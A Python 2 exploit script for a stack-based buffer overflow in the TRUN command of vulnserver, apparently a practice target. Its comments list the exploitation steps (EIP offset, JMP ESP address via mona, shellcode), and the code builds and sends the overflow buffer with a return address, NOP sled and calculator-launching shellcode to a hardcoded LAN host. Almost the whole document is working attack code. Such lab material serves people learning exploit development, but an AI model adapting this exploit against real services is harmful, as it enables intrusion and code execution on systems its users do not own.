#!/usr/bin/python

#Attack type: stack-based buffer overflow en TRUN para vulnserver.
#Scope: Buffer overflow with shellcode injection.
#Payload: TRUN .AAAAAAAAAAAAAAA... (A 5000 times)
#Results: Access violation when executing 41414141... EAX [ASCII TRUN .AAAAA...] ESP [ASCII AAAAAAAAA...] EBP [41414141] EIP [41414141]
#Steps: (1)find the offset of EIP. (2)find JMP ESP mem address (!mona jmp -r esp) = 0x625011af (change to little endian). (3) add shellcode. (4) add some space.
#ToDo: why the vulnserver only crash in debugger mode, and cant crash in normal way. app in normal way can be crashed after 3 or more attempts.

import socket
import os
import sys
import time

host = "192.168.0.2"
port = 9999

left_offset = "A" * 2006
jumper = '\xBB\x11\x50\x62'
badchars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
shellcode_calc = "\xb8\xe2\x1b\x35\xab\xdb\xd7\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x31\x31\x42\x13\x03\x42\x13\x83\xea\x1e\xf9\xc0\x57\x36\x7c\x2a\xa8\xc6\xe1\xa2\x4d\xf7\x21\xd0\x06\xa7\x91\x92\x4b\x4b\x59\xf6\x7f\xd8\x2f\xdf\x70\x69\x85\x39\xbe\x6a\xb6\x7a\xa1\xe8\xc5\xae\x01\xd1\x05\xa3\x40\x16\x7b\x4e\x10\xcf\xf7\xfd\x85\x64\x4d\x3e\x2d\x36\x43\x46\xd2\x8e\x62\x67\x45\x85\x3c\xa7\x67\x4a\x35\xee\x7f\x8f\x70\xb8\xf4\x7b\x0e\x3b\xdd\xb2\xef\x90\x20\x7b\x02\xe8\x65\xbb\xfd\x9f\x9f\xb8\x80\xa7\x5b\xc3\x5e\x2d\x78\x63\x14\x95\xa4\x92\xf9\x40\x2e\x98\xb6\x07\x68\xbc\x49\xcb\x02\xb8\xc2\xea\xc4\x49\x90\xc8\xc0\x12\x42\x70\x50\xfe\x25\x8d\x82\xa1\x9a\x2b\xc8\x4f\xce\x41\x93\x05\x11\xd7\xa9\x6b\x11\xe7\xb1\xdb\x7a\xd6\x3a\xb4\xfd\xe7\xe8\xf1\xf2\xad\xb1\x53\x9b\x6b\x20\xe6\xc6\x8b\x9e\x24\xff\x0f\x2b\xd4\x04\x0f\x5e\xd1\x41\x97\xb2\xab\xda\x72\xb5\x18\xda\x56\xd6\xff\x48\x3a\x37\x9a\xe8\xd9\x47"
right_offset = "D" * 1000
space = '\x90' * 16

buffer = "TRUN ." + left_offset + jumper + space + shellcode_calc + space

operation = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
operation.connect((host,port))
try:
	operation.sendall(buffer)
	time.sleep(5)
	operation.settimeout(5)
	data = operation.recv(2048)
	print(data)
except socket.error, e:
	print("Connection error: %s" % e)
	sys.exit(1)

operation.close()
sys.exit()

